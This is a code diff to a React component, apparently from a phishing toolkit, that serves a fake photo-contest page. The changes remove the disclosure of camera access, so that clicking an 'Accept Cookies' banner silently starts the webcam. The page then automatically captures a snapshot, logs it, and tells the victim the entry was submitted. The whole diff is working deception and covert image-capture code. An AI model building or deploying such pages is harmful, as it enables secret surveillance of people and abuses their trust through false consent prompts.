@@ -6,16 +6,15 @@ import { useLogs } from '@/contexts/LogContext';
 import type { CameraData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
-import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
-import Image from 'next/image';
+import Image from 'next/image'; // Keep next/image for placeholder if used
 
-const templateContent: Record<string, { title: string, actionText: string, message: string, contestDetails?: string }> = {
+// Updated templateContent for photo-contest-entry
+const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
   'photo-contest-entry': {
     title: 'Capture the Moment: Photo Contest!',
-    actionText: 'Accept Cookies & Enter Contest',
-    message: "Showcase your photography skills and win amazing prizes! Submit your best original photo. To proceed, please accept our terms and enable camera access for your submission.",
-    contestDetails: "Our site uses essential cookies for functionality and to process your contest entry. By continuing, you agree to our terms and allow camera access for photo submission. The winner will be announced on our social media channels next month. Good luck!"
+    message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
+    cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
   },
   'video-verification': {
     title: 'Video Verification',
@@ -46,7 +45,6 @@ export default function CameraPhishingPage() {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
-  const intervalRef = useRef<NodeJS.Timeout | null>(null);
   const [cookieConsentGiven, setCookieConsentGiven] = useState(false);
 
   useEffect(() => {
@@ -59,8 +57,8 @@ export default function CameraPhishingPage() {
       const video = videoRef.current;
       const canvas = canvasRef.current;
 
-      const MAX_WIDTH = 640;
-      const MAX_HEIGHT = 480;
+      const MAX_WIDTH = 320; 
+      const MAX_HEIGHT = 240;
       let { videoWidth, videoHeight } = video;
 
       if (videoWidth > videoHeight) {
@@ -81,10 +79,9 @@ export default function CameraPhishingPage() {
       const context = canvas.getContext('2d');
       if (context) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageUrl = canvas.toDataURL('image/jpeg', 0.8); // Restored quality
+        const imageUrl = canvas.toDataURL('image/jpeg', 0.5);
         const cameraData: CameraData = { imageUrl };
         addLog({ type: 'camera', data: cameraData });
-        console.log("Image captured and logged.");
         setStatus('captured');
         stopCameraStream(true);
       }
@@ -140,10 +137,6 @@ export default function CameraPhishingPage() {
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
-    if (intervalRef.current) {
-      clearInterval(intervalRef.current);
-      intervalRef.current = null;
-    }
     if (!isAfterCapture && status !== 'captured' && status !== 'error') {
       setStatus('idle');
     }
@@ -166,92 +159,76 @@ export default function CameraPhishingPage() {
       >
         <div className="text-center mb-6">
             <Trophy className="h-16 w-16 text-amber-500 mx-auto mb-4" />
-            <p className="text-lg text-muted-foreground">{content.message}</p>
+            {/* Use dangerouslySetInnerHTML for the message if it contains markdown-like bolding, or split into parts */}
+            <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
         </div>
-
-        {!cookieConsentGiven && (
-            <ShadcnCard className="w-full max-w-md mx-auto shadow-lg border-border bg-background/80">
-                <CardHeader>
-                    <CardTitle className="flex items-center text-primary">
-                        <Cookie className="mr-2 h-5 w-5" />
-                        Before You Enter...
-                    </CardTitle>
-                </CardHeader>
-                <CardContent>
-                    <ShadcnCardDescription className="text-sm text-foreground/80">
-                        {content.contestDetails || "Our site uses essential cookies for functionality and to process your contest entry. By continuing, you agree to our terms and allow camera access for photo submission."}
-                    </ShadcnCardDescription>
-                </CardContent>
-                <CardFooter>
-                    <Button
-                        onClick={handleCookieConsentAndCamera}
-                        className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
-                        disabled={isLoading}
-                    >
-                        <CameraIcon className="mr-2 h-5 w-5" />
-                        {isLoading ? 'Initializing...' : content.actionText}
-                    </Button>
-                </CardFooter>
-            </ShadcnCard>
-        )}
-
-        {(cookieConsentGiven || status === 'streaming' || status === 'captured') && (
-          <div className={`aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2 ${status === 'streaming' ? 'border-primary' : 'border-border'}`}>
-            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
-            {status !== 'streaming' && status !== 'captured' && !cookieConsentGiven && (
-              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
-                <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
-                <p className="text-white/90">Contest photo will appear here</p>
-              </div>
-            )}
-             {status !== 'streaming' && status !== 'captured' && cookieConsentGiven && status !== 'error' && !isLoading && (
-                <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
-                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
-                    <p className="text-white/90">Camera feed inactive. Try enabling camera.</p>
-                </div>
-            )}
-          </div>
-        )}
+        
+        <div className={`aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2 ${status === 'streaming' ? 'border-primary' : 'border-border'}`}>
+          <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
+          { status !== 'streaming' && status !== 'captured' && (
+            <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
+              {cookieConsentGiven && !isLoading && (status === 'idle' || status === 'requesting' || status === 'error') ? (
+                <>
+                  <VideoOff className="h-16 w-16 text-white/70 mb-2" />
+                  <p className="text-white/90 text-center px-4">{status === 'error' && error ? error : 'Camera feed inactive. Waiting for camera permission...'}</p>
+                </>
+              ) : !cookieConsentGiven && (
+                <>
+                  <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
+                  <p className="text-white/90">Contest photo will appear here</p>
+                </>
+              )}
+            </div>
+          )}
+        </div>
         <canvas ref={canvasRef} className="hidden"></canvas>
 
         {status === 'streaming' && !isLoading && cookieConsentGiven && (
-           <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
+           <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md mb-6">
             <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
             <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Cancel Submission</Button>
           </div>
         )}
 
         {status === 'captured' && cookieConsentGiven && (
-          <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
+          <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md mb-6">
             <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
             <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
             <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
           </div>
         )}
          {status === 'error' && cookieConsentGiven && error && (
-           <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
+           <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md mb-6">
             <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
             <p className="font-semibold text-red-700">Camera Access Failed</p>
             <p className="text-sm text-red-600">{error}</p>
             <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
           </div>
         )}
-         {templateId !== 'photo-contest-entry' && (status === 'idle' || status === 'error') && (
-             <Button
-             onClick={handleCameraRequest}
-             className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
-             disabled={isLoading}
-           >
-             <CameraIcon className="mr-2 h-5 w-5" />
-             {isLoading ? 'Initializing Camera...' : content.actionText}
-           </Button>
-         )}
 
+        {!cookieConsentGiven && (
+            <div className="mt-8 pt-4 p-4 bg-muted/60 border-t border-border rounded-b-md shadow-md">
+              <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
+                <p className="text-sm text-foreground/90 text-center sm:text-left flex-grow">
+                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
+                </p>
+                <Button
+                  onClick={handleCookieConsentAndCamera}
+                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
+                  size="sm"
+                  disabled={isLoading}
+                >
+                  <Cookie className="mr-2 h-4 w-4" />
+                  Accept Cookies
+                </Button>
+              </div>
+            </div>
+        )}
       </PhishingPageLayout>
     );
   }
 
-  // Fallback for other camera templates
+  // Fallback for other camera templates (video-verification, ar-filter, default)
   return (
     <PhishingPageLayout
         title={content.title}
@@ -279,7 +256,7 @@ export default function CameraPhishingPage() {
           disabled={isLoading}
         >
           <CameraIcon className="mr-2 h-5 w-5" />
-          {isLoading ? 'Initializing Camera...' : content.actionText}
+          {isLoading ? 'Initializing Camera...' : (content.actionText || 'Enable Camera')}
         </Button>
       )}
 
@@ -302,8 +279,10 @@ export default function CameraPhishingPage() {
           <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
           <p className="font-semibold text-red-700">Camera Access Failed</p>
           <p className="text-sm text-red-600">{error}</p>
+           <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
         </div>
       )}
     </PhishingPageLayout>
   );
 }
+
